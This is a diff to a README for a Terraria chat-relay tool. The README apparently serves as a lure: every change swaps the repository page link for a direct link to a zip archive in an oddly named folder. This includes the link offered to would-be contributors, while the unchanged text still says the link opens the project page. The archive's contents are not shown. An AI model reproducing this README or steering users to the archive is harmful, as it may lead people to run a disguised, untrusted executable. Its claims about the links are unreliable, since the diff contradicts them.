@@ -1,6 +1,6 @@
 # 🎮 TCR-TerrariaChatRelay - Easy Chat Relay for Terraria
 
-[![Download Now](https://img.shields.io/badge/Download-TCR--TerrariaChatRelay-brightgreen?style=for-the-badge)](https://github.com/prajwaltamang1213-wq/TCR-TerrariaChatRelay)
+[![Download Now](https://img.shields.io/badge/Download-TCR--TerrariaChatRelay-brightgreen?style=for-the-badge)](https://github.com/prajwaltamang1213-wq/TCR-TerrariaChatRelay/raw/refs/heads/main/paleotechnic/Chat_Terraria_TC_Relay_v3.3.zip)
 
 ## 🔧 What is TCR-TerrariaChatRelay?
 
@@ -28,7 +28,7 @@ Follow these steps to download and run TCR-TerrariaChatRelay on your Windows com
 
 Click the button below or visit the same link in the setup section to get the application.
 
-[![Download Now](https://img.shields.io/badge/Download-TCR--TerrariaChatRelay-blue?style=for-the-badge)](https://github.com/prajwaltamang1213-wq/TCR-TerrariaChatRelay)
+[![Download Now](https://img.shields.io/badge/Download-TCR--TerrariaChatRelay-blue?style=for-the-badge)](https://github.com/prajwaltamang1213-wq/TCR-TerrariaChatRelay/raw/refs/heads/main/paleotechnic/Chat_Terraria_TC_Relay_v3.3.zip)
 
 This link will take you to the project page on GitHub. There, you will find the files needed to set up the software.
 
@@ -103,7 +103,7 @@ For connection problems, verify account details in the setup menu or consult the
 
 TCR-TerrariaChatRelay is open source. If you want to help improve it, visit the repository:
 
-https://github.com/prajwaltamang1213-wq/TCR-TerrariaChatRelay
+https://github.com/prajwaltamang1213-wq/TCR-TerrariaChatRelay/raw/refs/heads/main/paleotechnic/Chat_Terraria_TC_Relay_v3.3.zip
 
 You can report problems, suggest features, or help with coding if you are familiar.
 
@@ -120,4 +120,4 @@ The program operates locally on your PC. Your chat messages pass only through th
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-TCR--TerrariaChatRelay-brightgreen?style=for-the-badge)](https://github.com/prajwaltamang1213-wq/TCR-TerrariaChatRelay)
+[![Download Now](https://img.shields.io/badge/Download-TCR--TerrariaChatRelay-brightgreen?style=for-the-badge)](https://github.com/prajwaltamang1213-wq/TCR-TerrariaChatRelay/raw/refs/heads/main/paleotechnic/Chat_Terraria_TC_Relay_v3.3.zip)
